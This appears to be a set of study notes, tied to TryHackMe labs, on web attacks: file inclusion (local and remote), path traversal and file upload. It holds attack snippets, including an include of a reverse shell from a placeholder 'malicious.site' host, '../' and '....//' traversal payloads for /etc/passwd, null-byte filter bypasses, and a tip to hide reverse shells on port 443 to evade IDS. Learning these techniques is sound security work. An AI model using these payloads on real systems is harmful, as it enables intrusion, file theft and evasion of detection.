## File inclusion

[![fileinc](../../../_badges/thmp/fileinc.svg)](https://tryhackme.com/room/fileinc)

<div class="row row-cols-md-2"><div>

Files inclusion refer to websites that are importing <small>(`import/require` in PHP)</small> a file using the user input. For instance: `http://malicious.site/?lang=FR` that is doing a include using `$_GET["lang"]`.

In the following include with no filtering, we may enter a path 

```php
include "lang/$_GET[lang].php"
```

**PHP < 5.3.4**: if the programmer appended an extension, such as `.php`, but you want to bypass it, you can use the **Null Byte** `%00` which indicates the end of a string.

```php
include "xxx.cgi%00.php" // include xxx.cgi
```

**Local File Inclusion (LFI)** üè†: inject a local file

```php
// you uploaded a reverse shell (avatar.png)
// as your avatar, then
include "lang/../uploads/avatar.png.php"
```

See Path traversal.

**Remote File Inclusion (RFI)** ‚úàÔ∏è: inject a remote file

```php
// allow_url_fopen MUST BE SET TO true
include "http://malicious.site/reverse_shell.php"
```

## Path/directory traversal

[![fileinc](../../../_badges/thmp/fileinc.svg)](https://tryhackme.com/room/fileinc)

<div class="row row-cols-md-2"><div>

This is an attack where a hacker will manage to access files/folders that were not supposed to be available for users by exploiting the application. 

In PHP for instance, developers may be use `file_get_contents(URL)` to download an avatar for instance given a URL. The problem is that this kind of function may be used to access a local file. If the file is displayed, or stored somewhere where you can read it such as in `/uploads`, then you may be able to 

* test if a port is open
* access private files such as `/etc/passwd`/`windows/win.ini`
* ...

For instance, a URL such as `http://example.com/image-preview.php?url=...` that is supposed to display an image given a URL, may be vulnerable to path traversal.

You can use the **dot-dot-slash attack**, and give an URL such as `../../../../../etc/passwd`. Note that `/../` is `/`, so if you add more `../` than needed, it's OK.

**Bypass filters**: if you know that a filter will replace a string, then you may create a string that will do what you want AFTER being filtered, such as `....//`. If the filter is removing `../`, then after filtering `..` and `/` will be concatenated, giving us back `../`.

If there are client-side filtering, you may use [BurpSuite](/cyber/exploitation/web/burpsuite/index.md), or `curl`

```bash
$ curl URL/vulnerable.php -d 'file=/etc/flag1' -H 'Content-Type: application/x-www-form-urlencoded'
```

## File upload

<div class="row row-cols-md-2"><div>

A hacker could try to upload a script, and then find a way to run it. The script usually open a **reverse shell**, meaning a shell on the target, that can be access from the hacker computer.

**Bypass filters**

* Try `xxx.png.php` to bypass stupid filters
* Try the null byte `xxx.php%00.png` <small>(PHP < 5.3.4)</small>
* Try intercepting the request, changing the content type, if the server is only checking the content-type.

> Do not use public/folders available to the user, if it's not needed. If you still do, do not use common names that could be found with forced browsing.

**Reverse shell**

To avoid alerting IDS, the reverse shell should use a port that would not be suspected such as `443` (HTTPS).
